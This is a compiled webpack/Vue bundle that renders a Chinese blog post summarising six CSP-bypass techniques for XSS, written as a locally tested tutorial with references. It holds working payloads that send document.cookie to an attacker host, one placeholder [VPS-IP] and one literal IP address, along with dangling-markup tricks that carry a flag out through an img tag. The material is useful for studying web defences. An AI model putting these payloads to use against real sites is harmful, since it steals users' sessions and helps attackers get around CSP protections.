(window.webpackJsonp=window.webpackJsonp||[]).push([[23],{500:function(t,s,a){"use strict";a.r(s);var r=a(32),e=Object(r.a)({},(function(){var t=this,s=t.$createElement,a=t._self._c||s;return a("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[a("blockquote",[a("p",[t._v("以下方法均是我根据几位师傅的文章加自己本地实验之后总结出来的方法，对于某些在本地无法实验或者实验不成功的这里不做记录。")])]),t._v(" "),a("h4",{attrs:{id:"location跳转绕过"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#location跳转绕过"}},[t._v("#")]),t._v(" location跳转绕过")]),t._v(" "),a("p",[a("strong",[t._v("适用条件：")])]),t._v(" "),a("ul",[a("li",[a("strong",[t._v("浏览器可以执行JS脚本，但是由于CSP的原因无法将数据外带（通常情况下 script-src 为 'unsafe-inline'）")])])]),t._v(" "),a("p",[t._v("实验代码如下")]),t._v(" "),a("p",[a("img",{attrs:{src:"https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200811085605.png",alt:"image-20200811085558748"}})]),t._v(" "),a("p",[t._v("由于策略指令的问题，我们的内嵌JS脚本可以被浏览器执行，但是无法将COOKIE向外部传输。但是大部分CSP不会限制跳转，所以可以利用跳转将CSP带到我们的远程VPS上")]),t._v(" "),a("div",{staticClass:"language-javascript line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-javascript"}},[a("code",[a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("script"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("location"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("href"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'http://[VPS-IP]/cookie/'")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("2")]),t._v("bdocument"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cookie"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("script"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])]),a("p",[t._v("跳转成功之后即可在VPS的日志文件中拿到COOKIE")]),t._v(" "),a("p",[a("img",{attrs:{src:"https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200811090051.png",alt:"image-20200811090039324"}})]),t._v(" "),a("h4",{attrs:{id:"iframe标签绕过"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#iframe标签绕过"}},[t._v("#")]),t._v(" iframe标签绕过")]),t._v(" "),a("p",[a("strong",[t._v("适用条件：")])]),t._v(" "),a("ul",[a("li",[a("strong",[t._v("A页面做了CSP防护，但是与之同源的B页面没有，就可以在B页面通过iframe用JS操作A页面的dom")])])]),t._v(" "),a("p",[t._v("实验代码如下")]),t._v(" "),a("p",[t._v("A页面：")]),t._v(" "),a("p",[a("img",{attrs:{src:"https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200811090231.png",alt:"image-20200811090231524"}})]),t._v(" "),a("p",[t._v("B页面：")]),t._v(" "),a("p",[a("img",{attrs:{src:"https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200811090247.png",alt:"image-20200811090247781"}})]),t._v(" "),a("p",[t._v("可以看到，由于A页面的策略指令为 "),a("em",[t._v("default-src 'self'")]),t._v(" 这个时候我们输入的JS代码将会被浏览器拦截，但是这种情况下可以在没有做CSP防护的B页面操作A页面的dom来带出COOKIE")]),t._v(" "),a("p",[a("img",{attrs:{src:"https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200811090959.png",alt:"image-20200811090442885"}})]),t._v(" "),a("h4",{attrs:{id:"base标签绕过"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#base标签绕过"}},[t._v("#")]),t._v(" base标签绕过")]),t._v(" "),a("p",[a("strong",[t._v("适用条件：")])]),t._v(" "),a("ul",[a("li",[a("strong",[t._v("script-src采用了nonce-xxxx，且default-src没有额外设置base-uri，就可以适用<base>标签来指定上下文相对路径的基准为自己的VPS")])])]),t._v(" "),a("p",[t._v("实验代码如下")]),t._v(" "),a("p",[a("img",{attrs:{src:"https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200811090749.png",alt:"image-20200811090748996"}})]),t._v(" "),a("p",[t._v("在本地有个1.js")]),t._v(" "),a("p",[a("img",{attrs:{src:"https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200811090809.png",alt:"image-20200811090809941"}})]),t._v(" "),a("div",{staticClass:"language-javascript line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-javascript"}},[a("code",[a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("?")]),t._v("test"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("base herf"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'http://127.0.0.1'")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("script nonce"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'xxxx'")]),t._v(" src"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'1.js'")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("script"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])]),a("p",[t._v("引入之后，造成XSS")]),t._v(" "),a("p",[a("img",{attrs:{src:"https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200811090952.png",alt:"image-20200811090952551"}})]),t._v(" "),a("h4",{attrs:{id:"不完整的script标签绕过"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#不完整的script标签绕过"}},[t._v("#")]),t._v(" 不完整的script标签绕过")]),t._v(" "),a("p",[a("strong",[t._v("适用条件：")])]),t._v(" "),a("ul",[a("li",[a("strong",[t._v("可控的输入点在合法的<script>标签上方并且中间没有其他标签的干扰、CSP的script-src只采用nonce的方式")])])]),t._v(" "),a("p",[a("strong",[t._v("注意：此方法在Chrome测试无效，以下实验均在Firefox中测试")])]),t._v(" "),a("p",[t._v("实验代码：")]),t._v(" "),a("p",[a("img",{attrs:{src:"https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200811091208.png",alt:"image-20200811091208572"}})]),t._v(" "),a("p",[t._v("由于一个简单的过滤函数存在，我们无法直接自定义一个合法的script标签，但是我们可以利用原本已经存在的合法script标签来将cookie带出")]),t._v(" "),a("div",{staticClass:"language-javascript line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-javascript"}},[a("code",[a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("?")]),t._v("test"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("script src"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("data"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("text"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("plain"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("location"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("href"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'http://112.124.27.13/cookie/'")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("2")]),t._v("bdocument"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cookie a"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("123")]),t._v(" a"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])]),a("p",[t._v("这样和下面合法script标签拼接起来就是")]),t._v(" "),a("div",{staticClass:"language-javascript line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-javascript"}},[a("code",[a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("script src"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("data"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("text"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("plain"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("location"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("href"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'http://112.124.27.13/cookie/'")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("2")]),t._v("bdocument"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cookie a"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("123")]),t._v(" a"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("script nonce"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"xxxx"')]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("····"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("script"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])]),a("p",[t._v("成功将我们输入的不完整的script标签拼接成完整的、合法化的标签")]),t._v(" "),a("p",[a("img",{attrs:{src:"https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200811091954.png",alt:"image-20200811091728999"}})]),t._v(" "),a("h4",{attrs:{id:"利用不完整的标签绕过"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#利用不完整的标签绕过"}},[t._v("#")]),t._v(" 利用不完整的标签绕过")]),t._v(" "),a("p",[t._v("某些网站有时候可能会引入外部图片且对外部图片没有限制，先看下面的实验代码")]),t._v(" "),a("p",[a("img",{attrs:{src:"https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200811101042.png",alt:"image-20200811100848671"}})]),t._v(" "),a("p",[t._v("其中一项策略指令为 "),a("em",[t._v("image-src *")]),t._v(" 即对外部图片的来源没有限制，这个时候有没有什么办法将下面的flag带出呢？")]),t._v(" "),a("div",{staticClass:"language-javascript line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-javascript"}},[a("code",[a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("img src"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v('"http'),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token constant"}},[t._v("VPS")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),a("span",{pre:!0,attrs:{class:"token constant"}},[t._v("IP")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("flag"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])]),a("p",[t._v("与下面拼接起来就是")]),t._v(" "),a("div",{staticClass:"language-javascript line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-javascript"}},[a("code",[a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("img src"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v('"http'),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token constant"}},[t._v("VPS")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),a("span",{pre:!0,attrs:{class:"token constant"}},[t._v("IP")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("flag"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("flag"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("xxxxxxxxxxxxx"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\nid"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"123"')]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br")])]),a("p",[t._v("由于payload只有一个引号，所以img标签的src属性会向后找引号用来闭合前面的引号，这样flag就被带出到的VPS的日志中了")]),t._v(" "),a("p",[a("img",{attrs:{src:"https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200811102023.png",alt:"image-20200811101343001"}})]),t._v(" "),a("h4",{attrs:{id:"svg标签绕过"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#svg标签绕过"}},[t._v("#")]),t._v(" svg标签绕过")]),t._v(" "),a("p",[a("strong",[t._v("适用条件：")])]),t._v(" "),a("ul",[a("li",[a("strong",[t._v("可以上传文件且没有过滤svg")])])]),t._v(" "),a("p",[t._v("svg标签中可以执行JS代码，可以通过一个正常的svg文件中嵌套恶意的JS代码来进行XSS")]),t._v(" "),a("p",[a("img",{attrs:{src:"https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200811101510.png",alt:"image-20200811101510460"}})]),t._v(" "),a("p",[a("img",{attrs:{src:"https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200811101520.png",alt:"image-20200811101520552"}})]),t._v(" "),a("hr"),t._v(" "),a("h4",{attrs:{id:"参考"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#参考"}},[t._v("#")]),t._v(" 参考")]),t._v(" "),a("p",[t._v("以上6点绕过方法并不是特别全面，以后碰到新的经过本地实验之后会进行补充")]),t._v(" "),a("p",[t._v("参考文章")]),t._v(" "),a("ul",[a("li",[t._v("evoA："),a("a",{attrs:{href:"https://xz.aliyun.com/t/5084",target:"_blank",rel:"noopener noreferrer"}},[t._v("我的CSP绕过思路及总结"),a("OutboundLink")],1)]),t._v(" "),a("li",[t._v("知乎二向箔安全学院："),a("a",{attrs:{href:"https://zhuanlan.zhihu.com/p/94246164",target:"_blank",rel:"noopener noreferrer"}},[t._v("CTF|有关CSP绕过的方法"),a("OutboundLink")],1)])])])}),[],!1,null,null,null);s.default=e.exports}}]);